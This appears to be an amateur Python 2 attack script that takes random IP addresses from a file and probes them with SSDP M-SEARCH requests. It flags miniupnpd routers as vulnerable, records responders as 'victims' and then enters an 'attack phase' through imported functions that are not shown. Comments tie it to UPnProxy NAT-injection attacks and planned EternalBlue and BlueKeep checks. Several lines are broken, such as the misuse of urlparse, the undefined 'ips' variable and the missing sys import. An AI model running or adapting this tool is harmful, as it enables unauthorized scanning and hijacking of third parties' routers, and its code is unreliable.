from random import shuffle
import socket
import json
import re, urllib2, httplib
from urlparse import urlparse
from xml.dom.minidom import parseString
from modded_user import *
import threading



remove_whitespace = re.compile(r'>\s*<')




#instrument eternal blue detection as well as bluekeep sorry i know the codes horrible im still earning how upnp works and python so be easy on me


class TheHeraldAngelSings:
  def __init__(self):
    self.Enpoint_locations = []
    self.Returned_EndPoints = []
    self.Vulnerable_stacks = []
    self.Vulnerable_eternal = []
    self.Vulnerable_blue_keep = [] #rdp exploit TODO
    
  def _retrieve_location_from_ssdp(self,response):
      """
      Parse raw HTTP response to retrieve the UPnP location header
      and return a ParseResult object.
      """
      if response:
       
         parsed_headers = re.findall(r'(?P<name>.*?): (?P<value>.*?)\r\n', response)
         header_locations = [header[1]
                        for header in parsed_headers
                        if header[0].lower() == 'location']
       
         if len(header_locations) < 1:
             pass

         if header_locations:
            try:
               return urlparse.urlparse(header_locations[0])
            except:
                pass
         else:
             pass







  def _m_search_ssdp(self,host):
      ssdp_request = ''.join(
		['M-SEARCH * HTTP/1.1\r\n',
		'HOST:'+host+':1900\r\n',
		'MAN: "ssdp:discover"\r\n',
		'MX: 2\r\n',
		'ST: {0}\r\n'.format('urn:schemas-upnp-org:device:InternetGatewayDevice:1'),
		'\r\n']
	)
      data = ""
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(ssdp_request, (host, 1900))
      sock.settimeout(3)

      try:
        
          data = sock.recv(2048)
        
      except:
          # socket has stopped reading on windows
          pass
      if data:
         return data
      else:
        pass







  #initiate discovery and attack phase for article
  #https://www.akamai.com/us/en/multimedia/documents/white-paper/upnproxy-blackhat-proxies-via-nat-injections-white-paper.pdf
  def initiate_ssdp_modification(self,host):
   
      result = self._m_search_ssdp(host)
      if result:
         print "Original Request"
         print "*" * 70
       
         print result
         print "*" * 70
       
         #add threads and timeout checks here main lag is here i think
         clean_location = self._retrieve_location_from_ssdp(result)
         if clean_location :
            print "Parsed Location"
            print "*" * 70
            print clean_location.scheme
            print clean_location.hostname
            print clean_location.port
            print clean_location.path
            print "*" * 70
            print "Modified Origin Url from returned Response"
            print "*" * 70
            Modified_host = clean_location.scheme +"://"+host+":"+str(clean_location.port)+clean_location.path
            print Modified_host 
            print "*" * 70
            #json.loads()only accepts double quoted key value pairs
            local_result = {"Ip":host,"Location":Modified_host,"Internal_IP":clean_location.hostname}
            if "UPnP/1.0 miniupnpd/1.0" in result:
                print("!!!!!Vulnerable Upnp Stack Possibly Detected!!!!!\n")
                self.Vulnerable_stacks.append(local_result)
            self.Returned_EndPoints.append(local_result)
            #print local_result
         else:
             pass
      else:
        pass




  def ip_prep(self,count_scan):
    
      files_dlloc = 'test.txt'
      files_dlloc2 = 'test1.txt'#used to try to avoid hitting same ip 2 times :)
      f = open(files_dlloc, 'r')
      f2 = open(files_dlloc2, 'a')
      raw_text = str(f.readlines())
      f.close()
      ip_address = r'(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})\.(?:[\d]{1,3})'
      foundip = re.findall( ip_address, raw_text )
      shuffle(foundip)
      print(len(set(foundip)))
      #trim the list down for research 
      trimmed_list = foundip[:int(count_scan)]#be nice can be adjusted or modified TODO fix this to allow command line option
    
      output_file = [elem for elem in foundip if elem not in trimmed_list ]
      for ips in output_file:
          f2.write(ips+"\n")
      f2.close()
    
      print(trimmed_list)
      for victim in trimmed_list:
          try:
              t1 = threading.Thread(target=self.initiate_ssdp_modification, args=(victim,))
              t1.start()
              t1.join()
            
           
          except:
             pass
    
    
    

  def retrieve_igd_profiles(self,ip_list):
      igd_profiles_local = []
      try:
          profile_grabbed = self._retrieve_igd_profile(ip_list)
          if profile_grabbed:
             local_profile = {"IP":ips,"IGD_Profile":profile_grabbed}
             print(local_profile)
             igd_profiles_local.append(local_profile)
             return igd_profiles_local
      except:
          pass
    


def main():
    #usage tool.py admin 500
    #admin or internal will be the calls to the code to develop back end attacks the next param is number of hosts to probe
    attack_method = sys.argv[1]
    
    outvics = open('outvics.txt','a')
    hark = TheHeraldAngelSings()
    hark.ip_prep(sys.argv[2])
    for vulnerable_stacks in hark.Vulnerable_stacks:
        print(vulnerable_stacks)
    
    for victim in hark.Returned_EndPoints:
        print(victim)
        
        outvics.write(json.dumps(victim)+"\n")
  
    outvics.close()
    print("Entering Attack Phase\n")
    try:
         if "admin" in attack_method:
             print("Attack Method Detected: " +attack_method)
             try:
                executer_admin(attack_method)
             except:
                pass
   


         if "internal" in attack_method:
             print("Attack Method Detected: " +attack_method)
             try:
                executer_internal(attack_method)#mod

             except:
                  pass
    except:
        pass
     
        
    

main()
